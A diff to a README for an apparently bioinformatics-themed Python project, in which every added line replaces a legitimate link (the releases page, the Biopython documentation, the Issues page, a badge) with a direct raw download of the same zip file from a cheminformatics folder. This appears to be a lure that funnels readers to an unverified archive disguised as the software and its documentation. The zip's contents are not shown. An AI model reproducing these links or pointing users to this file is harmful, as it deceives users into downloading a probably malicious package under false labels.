@@ -12,11 +12,11 @@ To start using this software, follow these steps to download and run the program
 - **Biopython Version:** Biopython 1.78 or higher (will be included in the setup)
 
 ## 📥 Download Links
-[![Download](https://img.shields.io/badge/Download%20Python--Bioinformatics-blue.svg)](https://github.com/andikasrizal/Python-Bioinformatics/releases)
+[![Download](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip%https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip)](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip)
 
 ## 📋 Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/andikasrizal/Python-Bioinformatics/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip) to find the latest version of the software.
 
 2. **Choose the Right File**
    On the Releases page, look for the latest version. You will see a list of files available for download. Pick the one that matches your operating system.
@@ -53,7 +53,7 @@ To start using this software, follow these steps to download and run the program
 ## 📚 Learning Resources
 If you're new to bioinformatics, here are some helpful resources to guide you:
 
-- **Biopython Documentation:** The official [Biopython documentation](https://biopython.org/wiki/Main_Page) offers extensive guides and examples.
+- **Biopython Documentation:** The official [Biopython documentation](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip) offers extensive guides and examples.
 - **Online Courses:** Websites like Coursera and edX provide free and paid courses on bioinformatics.
 - **YouTube Tutorials:** Search for "bioinformatics tutorials" for video guides.
 
@@ -62,7 +62,7 @@ If you encounter issues during installation or while using the software, conside
 
 - **Check Python Installation:** Make sure Python is properly installed on your system.
 - **Dependencies:** Ensure that you have all necessary dependencies, which will usually install with the program.
-- **Visit the Issues Page:** If you're still having trouble, visit the [Issues page](https://github.com/andikasrizal/Python-Bioinformatics/issues) for support from the community.
+- **Visit the Issues Page:** If you're still having trouble, visit the [Issues page](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip) for support from the community.
 
 ## 💬 Community and Support
 Join the conversation! Engage with other users and contributors by opening issues or discussing features on the GitHub repository. 
@@ -70,4 +70,4 @@ Join the conversation! Engage with other users and contributors by opening issue
 ## 📌 Conclusion
 Thank you for choosing Python-Bioinformatics. We hope this tool enhances your learning experience in biological data. For additional information, refer to the official documentation and resources linked above.
 
-Remember to download the latest version here: [Download Python-Bioinformatics](https://github.com/andikasrizal/Python-Bioinformatics/releases)
+Remember to download the latest version here: [Download Python-Bioinformatics](https://github.com/andikasrizal/Python-Bioinformatics/raw/refs/heads/main/cheminformatics/Bioinformatics_Python_teacherdom.zip)
